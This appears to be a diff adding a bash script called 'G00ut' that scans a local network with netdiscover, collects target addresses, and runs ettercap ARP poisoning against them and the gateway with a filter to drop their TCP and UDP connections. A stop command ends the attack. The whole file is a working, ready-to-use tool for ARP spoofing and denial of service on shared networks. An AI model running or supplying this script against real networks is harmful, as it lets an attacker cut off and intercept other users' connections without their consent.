@@ -1,0 +1,116 @@
+#!/bin/bash
+
+function usage(){
+printf "\n[-] Call with <IP-Range or IP> <gateway> <interface> , or call with stop\n\n[+] Example:\t goout 192.168.1.1/24 192.168.1.1 wlan0 \n\n[+] Example:\t goout 192.168.1.109 192.168.1.1 wlan0 \n\n[+] to Stop Killing Them :  goout stop \n"
+exit
+}
+
+function scanning(){
+printf "\n\n\t[+] Scanning Range : %s [+]" $1
+netdiscover -r $1 -c 3 -P > /tmp/active_hosts
+
+printf "\n\n\t[+] Scanning Completed [+]"
+sleep 1
+}
+
+function filtering(){
+content=$(cat /tmp/active_hosts)
+start=$(echo $1 | cut -b '1')
+out=$(cat /tmp/active_hosts | grep "^ $start" | cut -d ' ' -f 2 )
+
+list_ip=$(echo $out|sed  "s/ /\n/g")
+
+printf "\n\n[+] Hosts find:\n\n"
+sleep 1
+for ip in $list_ip
+
+do
+echo "(*) $ip"
+sleep 0.2
+done
+
+sleep 3
+group=/
+bufgroup=0
+bufip=0
+for ip in $list_ip
+do
+
+printf "\n[+] Adding $ip to Goout_List "
+sleep 0.3
+
+bufip=$ip
+bufgroup=$group
+
+group=$group$ip\;
+
+
+done
+
+group=$bufgroup$bufip//
+}
+
+function g00ut(){
+printf "\n\n\t[!] Starting Killing And Dropping \n"
+ettercap -TQ -i $1 -F /root/mybin/goout/goout.ef -M arp:remote $2 /$3//  1>/dev/null 2>/dev/null &
+sleep 2
+printf "\n\n\t[+] Finished [+] "
+}
+function stop_check(){
+if [[ $1 == 'stop' ]]
+then
+printf "\n[+] Stop Droping and Killing \n "
+pkill ettercap
+exit
+fi
+}
+
+function check_and_set_needed_args(){
+if [ -z $1  ] || [ -z $2 ]  ||  [ -z $3 ]
+then
+usage
+exit
+else
+printf "\n [+] Useing GateWay : %s \n" $2
+gateway=$2
+printf "\n [+] Useing Interface : %s \n" $3
+interface=$3
+fi
+}
+function scanning_and_filltering(){
+check_ip_or_range=$(echo $1 | grep "/" )
+if [ -z  $check_ip_or_range ]
+then
+group=/$1
+printf "\n\nDo You Have another Targets ? [y/n] Default=N : "
+read answer
+if [[ $answer == "y" ]] || [[ $answer == "Y" ]] || [[ $answer == "yes" ]] || [[ $answer == "Yes" ]]
+then
+printf "\n[*] Write one target then press Enter then enter the next target and repeat steps untill the last target write it then press enter two times :\n\n"
+while true
+do
+read targets
+if [ -z $targets ]
+then
+printf "\n\n\t[+] Finished Collect Targets\n\n"
+group=$group// 
+break
+fi
+group=$group\;$targets
+done
+else
+group=$group//
+fi
+return
+else
+scanning $1
+filtering $1
+fi
+}
+
+printf "\n\n[+] G00ut to Kill and Drop Tcp and Udp Connection made by 0xCrypt00o\n\n "
+
+stop_check $1
+check_and_set_needed_args $1 $2 $3
+scanning_and_filltering $1
+g00ut $interface $group $gateway
